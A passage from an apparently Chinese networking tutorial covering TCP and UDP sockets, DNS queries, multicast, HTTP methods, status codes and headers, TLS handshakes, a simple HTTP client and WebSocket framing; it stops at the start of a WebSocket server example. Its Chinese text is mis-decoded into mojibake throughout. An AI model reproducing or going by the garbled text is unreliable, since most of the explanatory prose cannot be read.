        print(f"[+] è¿æ¥å·²å…³é—­")

# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    conn = TCPConnection()

    if conn.connect('www.baidu.com', 80):
        # å‘é€HTTPè¯·æ±‚
        request = b'GET / HTTP/1.1\r\nHost: www.baidu.com\r\n\r\n'
        conn.send_data(request)

        # æ¥æ”¶å“åº”
        response = conn.receive_data()
        if response:
            print(f"\næ¥æ”¶åˆ°çš„æ•°æ®:\n{response[:200].decode('utf-8', errors='ignore')}...")

        # å…³é—­è¿æ¥
        conn.close()
```

### 5.2 UDP (User Datagram Protocol) åè®®

#### UDPæ•°æ®æŠ¥ç»“æ„

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         Source Port           â”‚      Destination Port         â”‚
â”‚           16 bits             â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚          Length               â”‚          Checksum             â”‚
â”‚         16 bits               â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                          Data                                 â”‚
â”‚                       (Variable)                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**å­—æ®µè¯´æ˜**:

1. **Source Port (16 bits)**: æºç«¯å£å·ï¼ˆå¯é€‰ï¼Œå¯ä»¥ä¸º0ï¼‰
2. **Destination Port (16 bits)**: ç›®æ ‡ç«¯å£å·
3. **Length (16 bits)**: UDPæ•°æ®æŠ¥æ€»é•¿åº¦ï¼ˆå¤´éƒ¨8å­—èŠ‚+æ•°æ®ï¼‰
4. **Checksum (16 bits)**: æ ¡éªŒå’Œï¼ˆå¯é€‰ï¼ŒIPv4ä¸­å¯ä»¥ä¸º0ï¼‰

#### UDPç‰¹ç‚¹

**ä¼˜åŠ¿**:
```
1. ä½å»¶è¿Ÿ - æ— éœ€å»ºç«‹è¿æ¥
2. ç®€å•é«˜æ•ˆ - å¤´éƒ¨ä»…8å­—èŠ‚
3. æ”¯æŒå¹¿æ’­å’Œç»„æ’­
4. æ— è¿æ¥çŠ¶æ€ç»´æŠ¤
```

**åŠ£åŠ¿**:
```
1. ä¸å¯é  - ä¸ä¿è¯æ•°æ®åˆ°è¾¾
2. æ— åº - ä¸ä¿è¯é¡ºåº
3. æ— æµé‡æ§åˆ¶
4. æ— æ‹¥å¡æ§åˆ¶
```

#### UDP vs TCPå¯¹æ¯”

| ç‰¹æ€§ | TCP | UDP |
|------|-----|-----|
| **è¿æ¥æ€§** | é¢å‘è¿æ¥ | æ— è¿æ¥ |
| **å¯é æ€§** | å¯é ä¼ è¾“ | ä¸å¯é ä¼ è¾“ |
| **é¡ºåº** | ä¿è¯é¡ºåº | ä¸ä¿è¯é¡ºåº |
| **å¤´éƒ¨å¤§å°** | 20-60å­—èŠ‚ | 8å­—èŠ‚ |
| **é€Ÿåº¦** | è¾ƒæ…¢ | å¿«é€Ÿ |
| **å¼€é”€** | å¤§ï¼ˆç¡®è®¤ã€é‡ä¼ ï¼‰ | å° |
| **æµé‡æ§åˆ¶** | æœ‰ | æ—  |
| **æ‹¥å¡æ§åˆ¶** | æœ‰ | æ—  |
| **é€‚ç”¨åœºæ™¯** | æ–‡ä»¶ä¼ è¾“ã€Web | è§†é¢‘ç›´æ’­ã€DNS |

#### UDPåº”ç”¨åœºæ™¯

**1. å®æ—¶éŸ³è§†é¢‘ä¼ è¾“**
```python
import socket

# UDPéŸ³é¢‘æµå‘é€ç«¯
def audio_sender(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # æ¨¡æ‹Ÿå‘é€éŸ³é¢‘æ•°æ®
    for i in range(100):
        audio_data = f"Audio Frame {i}".encode()
        sock.sendto(audio_data, (host, port))
        print(f"å‘é€éŸ³é¢‘å¸§ {i}")
        time.sleep(0.02)  # 50fps

    sock.close()

# UDPéŸ³é¢‘æµæ¥æ”¶ç«¯
def audio_receiver(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))

    print(f"æ­£åœ¨ç›‘å¬ç«¯å£ {port}...")

    while True:
        data, addr = sock.recvfrom(1024)
        print(f"ä» {addr} æ¥æ”¶: {data.decode()}")
```

**2. DNSæŸ¥è¯¢**
```python
import socket
import struct

def dns_query(domain, dns_server='8.8.8.8', port=53):
    """å‘é€DNSæŸ¥è¯¢"""
    # æ„é€ DNSæŸ¥è¯¢æ•°æ®åŒ…
    transaction_id = 0x1234
    flags = 0x0100  # æ ‡å‡†æŸ¥è¯¢
    questions = 1
    answer_rrs = 0
    authority_rrs = 0
    additional_rrs = 0

    # DNSå¤´éƒ¨
    header = struct.pack('!HHHHHH', transaction_id, flags, questions,
                         answer_rrs, authority_rrs, additional_rrs)

    # æŸ¥è¯¢éƒ¨åˆ†
    qname = b''
    for part in domain.split('.'):
        qname += bytes([len(part)]) + part.encode()
    qname += b'\x00'  # ç»“æŸç¬¦

    qtype = 1   # Aè®°å½•
    qclass = 1  # INç±»
    question = qname + struct.pack('!HH', qtype, qclass)

    # å‘é€æŸ¥è¯¢
    query = header + question
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)

    try:
        sock.sendto(query, (dns_server, port))
        response, _ = sock.recvfrom(512)
        print(f"DNSå“åº”é•¿åº¦: {len(response)} å­—èŠ‚")
        # è§£æå“åº”...
        return response
    except socket.timeout:
        print("DNSæŸ¥è¯¢è¶…æ—¶")
        return None
    finally:
        sock.close()

# ä½¿ç”¨ç¤ºä¾‹
dns_query("www.baidu.com")
```

**3. UDPç»„æ’­**
```python
import socket
import struct

def udp_multicast_sender(multicast_group, port, ttl=2):
    """UDPç»„æ’­å‘é€ç«¯"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # è®¾ç½®TTL
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL,
                    struct.pack('b', ttl))

    try:
        for i in range(10):
            message = f"Multicast message {i}".encode()
            sock.sendto(message, (multicast_group, port))
            print(f"å‘é€ç»„æ’­æ¶ˆæ¯ {i}")
            time.sleep(1)
    finally:
        sock.close()

def udp_multicast_receiver(multicast_group, port):
    """UDPç»„æ’­æ¥æ”¶ç«¯"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # ç»‘å®šåˆ°ç«¯å£
    sock.bind(('', port))

    # åŠ å…¥ç»„æ’­ç»„
    mreq = struct.pack('4sl', socket.inet_aton(multicast_group),
                       socket.INADDR_ANY)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

    print(f"å·²åŠ å…¥ç»„æ’­ç»„ {multicast_group}:{port}")

    try:
        while True:
            data, addr = sock.recvfrom(1024)
            print(f"ä» {addr} æ¥æ”¶: {data.decode()}")
    except KeyboardInterrupt:
        pass
    finally:
        sock.close()

# ä½¿ç”¨ç¤ºä¾‹
# å‘é€ç«¯: udp_multicast_sender('224.0.0.1', 5007)
# æ¥æ”¶ç«¯: udp_multicast_receiver('224.0.0.1', 5007)
```

---

## ç¬¬å…­ç« ï¼šåº”ç”¨å±‚åè®®

### 6.1 HTTP/HTTPS åè®®æ·±åº¦è§£æ

#### HTTPåè®®ç‰¹ç‚¹

- **æ— çŠ¶æ€**: æ¯æ¬¡è¯·æ±‚éƒ½æ˜¯ç‹¬ç«‹çš„ï¼ŒæœåŠ¡å™¨ä¸ä¿å­˜å®¢æˆ·ç«¯çŠ¶æ€
- **åŸºäºè¯·æ±‚-å“åº”**: å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›å“åº”
- **æ–‡æœ¬åè®®**: ä½¿ç”¨å¯è¯»çš„æ–‡æœ¬æ ¼å¼ä¼ è¾“æ•°æ®
- **é»˜è®¤ç«¯å£**: HTTPä½¿ç”¨80ç«¯å£ï¼ŒHTTPSä½¿ç”¨443ç«¯å£

#### HTTPè¯·æ±‚æ ¼å¼

```
GET /api/users HTTP/1.1\r\n
Host: example.com\r\n
User-Agent: Mozilla/5.0\r\n
Accept: application/json\r\n
Connection: keep-alive\r\n
\r\n
[è¯·æ±‚ä½“]
```

**è¯·æ±‚è¡Œç»„æˆ**:
```
æ–¹æ³• + ç©ºæ ¼ + URI + ç©ºæ ¼ + åè®®ç‰ˆæœ¬ + CRLF
GET /index.html HTTP/1.1\r\n
```

#### HTTPè¯·æ±‚æ–¹æ³•è¯¦è§£

| æ–¹æ³• | æè¿° | å¹‚ç­‰æ€§ | å®‰å…¨æ€§ | è¯·æ±‚ä½“ | å“åº”ä½“ | å…¸å‹ç”¨é€” |
|------|------|--------|--------|--------|--------|---------|
| **GET** | è·å–èµ„æº | æ˜¯ | æ˜¯ | å¦ | æ˜¯ | æŸ¥è¯¢æ•°æ®ã€ä¸‹è½½æ–‡ä»¶ |
| **POST** | åˆ›å»ºèµ„æº | å¦ | å¦ | æ˜¯ | æ˜¯ | æäº¤è¡¨å•ã€ä¸Šä¼ æ–‡ä»¶ |
| **PUT** | æ›´æ–°èµ„æº | æ˜¯ | å¦ | æ˜¯ | æ˜¯ | å®Œæ•´æ›´æ–°èµ„æº |
| **PATCH** | éƒ¨åˆ†æ›´æ–° | å¦ | å¦ | æ˜¯ | æ˜¯ | éƒ¨åˆ†æ›´æ–°èµ„æº |
| **DELETE** | åˆ é™¤èµ„æº | æ˜¯ | å¦ | å¯é€‰ | å¯é€‰ | åˆ é™¤æ•°æ® |
| **HEAD** | è·å–å¤´éƒ¨ | æ˜¯ | æ˜¯ | å¦ | å¦ | æ£€æŸ¥èµ„æºæ˜¯å¦å­˜åœ¨ |
| **OPTIONS** | è·å–æ”¯æŒçš„æ–¹æ³• | æ˜¯ | æ˜¯ | å¦ | æ˜¯ | CORSé¢„æ£€è¯·æ±‚ |
| **TRACE** | è¿½è¸ªè¯·æ±‚ | æ˜¯ | æ˜¯ | å¦ | æ˜¯ | è¯Šæ–­ |
| **CONNECT** | å»ºç«‹éš§é“ | å¦ | å¦ | å¯é€‰ | å¯é€‰ | HTTPSä»£ç† |

#### HTTPçŠ¶æ€ç å®Œæ•´åˆ†ç±»

**1xx - ä¿¡æ¯æ€§çŠ¶æ€ç **
```
100 Continue          - å®¢æˆ·ç«¯åº”ç»§ç»­è¯·æ±‚
101 Switching Protocols - æœåŠ¡å™¨æ­£åœ¨åˆ‡æ¢åè®®
102 Processing        - æœåŠ¡å™¨æ­£åœ¨å¤„ç†è¯·æ±‚ï¼ˆWebDAVï¼‰
103 Early Hints       - æå‰è¿”å›éƒ¨åˆ†å“åº”å¤´
```

**2xx - æˆåŠŸçŠ¶æ€ç **
```
200 OK                - è¯·æ±‚æˆåŠŸ
201 Created           - èµ„æºå·²åˆ›å»º
202 Accepted          - è¯·æ±‚å·²æ¥å—ï¼Œä½†æœªå®Œæˆå¤„ç†
203 Non-Authoritative - è¿”å›çš„ä¿¡æ¯å¯èƒ½æ¥è‡ªå‰¯æœ¬
204 No Content        - è¯·æ±‚æˆåŠŸä½†æ— è¿”å›å†…å®¹
205 Reset Content     - è¯·æ±‚æˆåŠŸï¼Œé‡ç½®æ–‡æ¡£è§†å›¾
206 Partial Content   - éƒ¨åˆ†å†…å®¹ï¼ˆRangeè¯·æ±‚ï¼‰
```

**3xx - é‡å®šå‘çŠ¶æ€ç **
```
300 Multiple Choices  - å¤šç§é€‰æ‹©
301 Moved Permanently - æ°¸ä¹…é‡å®šå‘
302 Found             - ä¸´æ—¶é‡å®šå‘
303 See Other         - æŸ¥çœ‹å…¶ä»–ä½ç½®
304 Not Modified      - èµ„æºæœªä¿®æ”¹ï¼Œä½¿ç”¨ç¼“å­˜
307 Temporary Redirect - ä¸´æ—¶é‡å®šå‘ï¼ˆä¿æŒæ–¹æ³•ï¼‰
308 Permanent Redirect - æ°¸ä¹…é‡å®šå‘ï¼ˆä¿æŒæ–¹æ³•ï¼‰
```

**4xx - å®¢æˆ·ç«¯é”™è¯¯**
```
400 Bad Request       - è¯·æ±‚è¯­æ³•é”™è¯¯
401 Unauthorized      - æœªè®¤è¯
402 Payment Required  - ä¿ç•™ï¼ˆæœªä½¿ç”¨ï¼‰
403 Forbidden         - ç¦æ­¢è®¿é—®
404 Not Found         - èµ„æºä¸å­˜åœ¨
405 Method Not Allowed - æ–¹æ³•ä¸å…è®¸
406 Not Acceptable    - ä¸å¯æ¥å—
407 Proxy Authentication Required - éœ€è¦ä»£ç†è®¤è¯
408 Request Timeout   - è¯·æ±‚è¶…æ—¶
409 Conflict          - å†²çª
410 Gone              - èµ„æºå·²æ°¸ä¹…åˆ é™¤
411 Length Required   - éœ€è¦Content-Length
412 Precondition Failed - å‰ç½®æ¡ä»¶å¤±è´¥
413 Payload Too Large - è¯·æ±‚ä½“è¿‡å¤§
414 URI Too Long      - URIè¿‡é•¿
415 Unsupported Media Type - ä¸æ”¯æŒçš„åª’ä½“ç±»å‹
416 Range Not Satisfiable - Rangeè¯·æ±‚æ— æ•ˆ
417 Expectation Failed - Expectå¤´éƒ¨å¤±è´¥
418 I'm a teapot      - å½©è›‹çŠ¶æ€ç 
421 Misdirected Request - è¯·æ±‚è¢«é”™è¯¯å®šå‘
422 Unprocessable Entity - æ— æ³•å¤„ç†å®ä½“
423 Locked            - èµ„æºè¢«é”å®š
424 Failed Dependency - ä¾èµ–å¤±è´¥
425 Too Early         - è¯·æ±‚è¿‡æ—©
426 Upgrade Required  - éœ€è¦å‡çº§åè®®
428 Precondition Required - éœ€è¦å‰ç½®æ¡ä»¶
429 Too Many Requests - è¯·æ±‚è¿‡å¤š
431 Request Header Fields Too Large - è¯·æ±‚å¤´è¿‡å¤§
451 Unavailable For Legal Reasons - å› æ³•å¾‹åŸå› ä¸å¯ç”¨
```

**5xx - æœåŠ¡å™¨é”™è¯¯**
```
500 Internal Server Error - æœåŠ¡å™¨å†…éƒ¨é”™è¯¯
501 Not Implemented   - åŠŸèƒ½æœªå®ç°
502 Bad Gateway       - ç½‘å…³é”™è¯¯
503 Service Unavailable - æœåŠ¡ä¸å¯ç”¨
504 Gateway Timeout   - ç½‘å…³è¶…æ—¶
505 HTTP Version Not Supported - HTTPç‰ˆæœ¬ä¸æ”¯æŒ
506 Variant Also Negotiates - å†…éƒ¨é…ç½®é”™è¯¯
507 Insufficient Storage - å­˜å‚¨ç©ºé—´ä¸è¶³
508 Loop Detected     - æ£€æµ‹åˆ°å¾ªç¯
510 Not Extended      - éœ€è¦æ‰©å±•
511 Network Authentication Required - éœ€è¦ç½‘ç»œè®¤è¯
```

#### HTTPå¤´éƒ¨å­—æ®µ

**é€šç”¨å¤´éƒ¨**:
```
Cache-Control: max-age=3600       # ç¼“å­˜æ§åˆ¶
Connection: keep-alive            # è¿æ¥ç®¡ç†
Date: Wed, 21 Oct 2015 07:28:00 GMT # æ¶ˆæ¯å‘é€æ—¶é—´
Transfer-Encoding: chunked        # ä¼ è¾“ç¼–ç 
Upgrade: websocket                # åè®®å‡çº§
Via: 1.1 proxy.example.com        # ä»£ç†ä¿¡æ¯
Warning: 199 Miscellaneous warning # è­¦å‘Šä¿¡æ¯
```

**è¯·æ±‚å¤´éƒ¨**:
```
Accept: application/json          # å¯æ¥å—çš„åª’ä½“ç±»å‹
Accept-Charset: utf-8             # å¯æ¥å—çš„å­—ç¬¦é›†
Accept-Encoding: gzip, deflate    # å¯æ¥å—çš„ç¼–ç 
Accept-Language: en-US,en;q=0.9   # å¯æ¥å—çš„è¯­è¨€
Authorization: Bearer <token>     # è®¤è¯ä¿¡æ¯
Cookie: session=abc123            # Cookie
Host: www.example.com             # ä¸»æœºåï¼ˆå¿…éœ€ï¼‰
If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT # æ¡ä»¶è¯·æ±‚
If-None-Match: "686897696a7c876b7e" # ETagæ¡ä»¶
Referer: https://www.google.com/  # æ¥æºé¡µé¢
User-Agent: Mozilla/5.0...        # ç”¨æˆ·ä»£ç†
Origin: https://example.com       # è¯·æ±‚æ¥æºï¼ˆCORSï¼‰
```

**å“åº”å¤´éƒ¨**:
```
Age: 12                           # ç¼“å­˜å¹´é¾„
Allow: GET, POST, HEAD            # å…è®¸çš„æ–¹æ³•
Content-Encoding: gzip            # å†…å®¹ç¼–ç 
Content-Language: en              # å†…å®¹è¯­è¨€
Content-Length: 1234              # å†…å®¹é•¿åº¦
Content-Type: application/json    # å†…å®¹ç±»å‹
ETag: "686897696a7c876b7e"        # å®ä½“æ ‡ç­¾
Expires: Wed, 21 Oct 2015 07:28:00 GMT # è¿‡æœŸæ—¶é—´
Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT # æœ€åä¿®æ”¹æ—¶é—´
Location: https://www.example.com/ # é‡å®šå‘ä½ç½®
Server: nginx/1.18.0              # æœåŠ¡å™¨ä¿¡æ¯
Set-Cookie: session=abc123; HttpOnly # è®¾ç½®Cookie
WWW-Authenticate: Basic realm="Access" # è®¤è¯æ–¹å¼
Access-Control-Allow-Origin: *    # CORSå¤´éƒ¨
```

#### HTTP/1.1 vs HTTP/2 vs HTTP/3

| ç‰¹æ€§ | HTTP/1.1 | HTTP/2 | HTTP/3 |
|------|----------|--------|--------|
| **ä¼ è¾“å±‚** | TCP | TCP | QUIC (UDP) |
| **å¤šè·¯å¤ç”¨** | å¦ | æ˜¯ | æ˜¯ |
| **å¤´éƒ¨å‹ç¼©** | å¦ | HPACK | QPACK |
| **æœåŠ¡å™¨æ¨é€** | å¦ | æ˜¯ | æ˜¯ |
| **äºŒè¿›åˆ¶åè®®** | å¦ | æ˜¯ | æ˜¯ |
| **é˜Ÿå¤´é˜»å¡** | æ˜¯ | éƒ¨åˆ†ï¼ˆTCPå±‚ï¼‰ | å¦ |
| **è¿æ¥å¤ç”¨** | éœ€Keep-Alive | æ˜¯ | æ˜¯ |
| **åŠ å¯†** | å¯é€‰ï¼ˆHTTPSï¼‰ | é€šå¸¸è¦æ±‚ | å¼ºåˆ¶TLS 1.3 |

#### HTTPSå·¥ä½œåŸç†

**HTTPS = HTTP + TLS/SSL**

**TLSæ¡æ‰‹è¿‡ç¨‹**:

```
å®¢æˆ·ç«¯                                     æœåŠ¡å™¨
   â”‚                                         â”‚
   â”‚â”€â”€â”€â”€â”€â”€ ClientHello â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  1. æ”¯æŒçš„åè®®ç‰ˆæœ¬å’ŒåŠ å¯†å¥—ä»¶
   â”‚                                         â”‚
   â”‚â†â”€â”€â”€â”€â”€ ServerHello â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  2. é€‰æ‹©çš„åè®®ç‰ˆæœ¬å’ŒåŠ å¯†å¥—ä»¶
   â”‚â†â”€â”€â”€â”€â”€ Certificate â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  3. æœåŠ¡å™¨è¯ä¹¦
   â”‚â†â”€â”€â”€â”€â”€ ServerHelloDone â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  4. æ¡æ‰‹å®Œæˆ
   â”‚                                         â”‚
   â”‚â”€â”€â”€â”€â”€â”€ ClientKeyExchange â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  5. é¢„ä¸»å¯†é’¥ï¼ˆåŠ å¯†ï¼‰
   â”‚â”€â”€â”€â”€â”€â”€ ChangeCipherSpec â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  6. åˆ‡æ¢åˆ°åŠ å¯†é€šä¿¡
   â”‚â”€â”€â”€â”€â”€â”€ Finished â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  7. æ¡æ‰‹å®Œæˆæ¶ˆæ¯
   â”‚                                         â”‚
   â”‚â†â”€â”€â”€â”€â”€ ChangeCipherSpec â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  8. åˆ‡æ¢åˆ°åŠ å¯†é€šä¿¡
   â”‚â†â”€â”€â”€â”€â”€ Finished â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  9. æ¡æ‰‹å®Œæˆæ¶ˆæ¯
   â”‚                                         â”‚
   â”‚ â•â•â•â•â•â• åŠ å¯†çš„åº”ç”¨æ•°æ® â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â”‚
   â”‚                                         â”‚
```

**å®æˆ˜ç¤ºä¾‹ï¼šHTTPå®¢æˆ·ç«¯å®ç°**

```python
import socket
import ssl

class HTTPClient:
    """ç®€å•çš„HTTP/HTTPSå®¢æˆ·ç«¯"""

    def __init__(self):
        self.sock = None

    def request(self, method, url, headers=None, body=None):
        """å‘é€HTTPè¯·æ±‚"""
        # è§£æURL
        if url.startswith('https://'):
            protocol = 'https'
            default_port = 443
            url = url[8:]
        elif url.startswith('http://'):
            protocol = 'http'
            default_port = 80
            url = url[7:]
        else:
            protocol = 'http'
            default_port = 80

        # åˆ†ç¦»ä¸»æœºå’Œè·¯å¾„
        if '/' in url:
            host, path = url.split('/', 1)
            path = '/' + path
        else:
            host = url
            path = '/'

        # åˆ†ç¦»ç«¯å£
        if ':' in host:
            host, port = host.split(':')
            port = int(port)
        else:
            port = default_port

        # æ„é€ è¯·æ±‚
        request_line = f"{method} {path} HTTP/1.1\r\n"

        # é»˜è®¤å¤´éƒ¨
        if headers is None:
            headers = {}
        headers.setdefault('Host', host)
        headers.setdefault('User-Agent', 'Python-HTTP-Client/1.0')
        headers.setdefault('Connection', 'close')

        if body:
            headers['Content-Length'] = str(len(body))

        # æ„é€ å¤´éƒ¨
        header_lines = '\r\n'.join([f"{k}: {v}" for k, v in headers.items()])

        # å®Œæ•´è¯·æ±‚
        request = request_line + header_lines + '\r\n\r\n'
        if body:
            request += body

        # å‘é€è¯·æ±‚
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        if protocol == 'https':
            # TLSåŒ…è£…
            context = ssl.create_default_context()
            self.sock = context.wrap_socket(self.sock, server_hostname=host)

        self.sock.connect((host, port))
        self.sock.sendall(request.encode())

        # æ¥æ”¶å“åº”
        response = b''
        while True:
            chunk = self.sock.recv(4096)
            if not chunk:
                break
            response += chunk

        self.sock.close()

        # è§£æå“åº”
        return self.parse_response(response)

    def parse_response(self, response):
        """è§£æHTTPå“åº”"""
        response_str = response.decode('utf-8', errors='ignore')

        # åˆ†ç¦»å¤´éƒ¨å’Œä¸»ä½“
        if '\r\n\r\n' in response_str:
            headers, body = response_str.split('\r\n\r\n', 1)
        else:
            headers = response_str
            body = ''

        # è§£æçŠ¶æ€è¡Œ
        lines = headers.split('\r\n')
        status_line = lines[0]
        parts = status_line.split(' ', 2)

        if len(parts) >= 3:
            version, status_code, reason = parts
        else:
            version, status_code, reason = parts[0], parts[1], ''

        # è§£æå¤´éƒ¨
        header_dict = {}
        for line in lines[1:]:
            if ': ' in line:
                key, value = line.split(': ', 1)
                header_dict[key] = value

        return {
            'version': version,
            'status_code': int(status_code),
            'reason': reason,
            'headers': header_dict,
            'body': body
        }

    def get(self, url, headers=None):
        """GETè¯·æ±‚"""
        return self.request('GET', url, headers)

    def post(self, url, data, headers=None):
        """POSTè¯·æ±‚"""
        return self.request('POST', url, headers, data)

# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    client = HTTPClient()

    # HTTP GETè¯·æ±‚
    print("=" * 60)
    print("HTTP GET è¯·æ±‚ç¤ºä¾‹")
    print("=" * 60)
    response = client.get('http://www.baidu.com/')
    print(f"çŠ¶æ€ç : {response['status_code']}")
    print(f"å“åº”ä½“: {response['body'][:200]}...")

    # HTTPS GETè¯·æ±‚
    print("\n" + "=" * 60)
    print("HTTPS GET è¯·æ±‚ç¤ºä¾‹")
    print("=" * 60)
    response = client.get('https://www.baidu.com/')
    print(f"çŠ¶æ€ç : {response['status_code']}")
    print(f"Content-Type: {response['headers'].get('Content-Type')}")
```

### 6.2 WebSocket åè®®

#### WebSocketç‰¹ç‚¹

**ä¸HTTPçš„åŒºåˆ«**:
```
HTTP:
- è¯·æ±‚-å“åº”æ¨¡å¼
- å•å‘é€šä¿¡
- æ¯æ¬¡è¯·æ±‚éƒ½éœ€è¦å»ºç«‹è¿æ¥
- å¤´éƒ¨å¼€é”€å¤§

WebSocket:
- å…¨åŒå·¥é€šä¿¡
- æŒä¹…è¿æ¥
- æœåŠ¡å™¨å¯ä¸»åŠ¨æ¨é€
- å¤´éƒ¨å¼€é”€å°ï¼ˆæ¡æ‰‹åï¼‰
```

#### WebSocketæ¡æ‰‹è¿‡ç¨‹

```
å®¢æˆ·ç«¯                                     æœåŠ¡å™¨
   â”‚                                         â”‚
   â”‚â”€â”€â”€â”€â”€â”€ HTTP Upgrade Request â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚
   â”‚  GET /chat HTTP/1.1                     â”‚
   â”‚  Host: server.example.com               â”‚
   â”‚  Upgrade: websocket                     â”‚
   â”‚  Connection: Upgrade                    â”‚
   â”‚  Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
   â”‚  Sec-WebSocket-Version: 13              â”‚
   â”‚                                         â”‚
   â”‚â†â”€â”€â”€â”€â”€ HTTP 101 Switching Protocols â”€â”€â”€â”€â”‚
   â”‚  HTTP/1.1 101 Switching Protocols       â”‚
   â”‚  Upgrade: websocket                     â”‚
   â”‚  Connection: Upgrade                    â”‚
   â”‚  Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
   â”‚                                         â”‚
   â”‚ â•â•â•â•â•â• WebSocket æ•°æ®å¸§ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â”‚
   â”‚                                         â”‚
```

#### WebSocketæ•°æ®å¸§æ ¼å¼

```
  0                   1                   2                   3
  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
 +-+-+-+-+-------+-+-------------+-------------------------------+
 |F|R|R|R| opcode|M| Payload len |    Extended payload length    |
 |I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
 |N|V|V|V|       |S|             |   (if payload len==126/127)   |
 | |1|2|3|       |K|             |                               |
 +-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
 |     Extended payload length continued, if payload len == 127  |
 + - - - - - - - - - - - - - - - +-------------------------------+
 |                               |Masking-key, if MASK set to 1  |
 +-------------------------------+-------------------------------+
 | Masking-key (continued)       |          Payload Data         |
 +-------------------------------- - - - - - - - - - - - - - - - +
 :                     Payload Data continued ...                :
 + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
 |                     Payload Data continued ...                |
 +---------------------------------------------------------------+
```

**å­—æ®µè¯´æ˜**:

- **FIN (1 bit)**: æ˜¯å¦ä¸ºæœ€åä¸€å¸§
- **RSV1-3 (3 bits)**: ä¿ç•™ä½
- **Opcode (4 bits)**: æ“ä½œç 
  ```
  0x0: ç»§ç»­å¸§
  0x1: æ–‡æœ¬å¸§
  0x2: äºŒè¿›åˆ¶å¸§
  0x8: è¿æ¥å…³é—­
  0x9: Ping
  0xA: Pong
  ```
- **MASK (1 bit)**: æ˜¯å¦ä½¿ç”¨æ©ç ï¼ˆå®¢æˆ·ç«¯å¿…é¡»ä¸º1ï¼‰
- **Payload Length (7 bits)**: è´Ÿè½½é•¿åº¦
  - 0-125: å®é™…é•¿åº¦
  - 126: åç»­2å­—èŠ‚ä¸ºé•¿åº¦
  - 127: åç»­8å­—èŠ‚ä¸ºé•¿åº¦
- **Masking-key (32 bits)**: æ©ç å¯†é’¥
- **Payload Data**: å®é™…æ•°æ®

**å®æˆ˜ç¤ºä¾‹ï¼šWebSocketæœåŠ¡å™¨**

```python
import socket
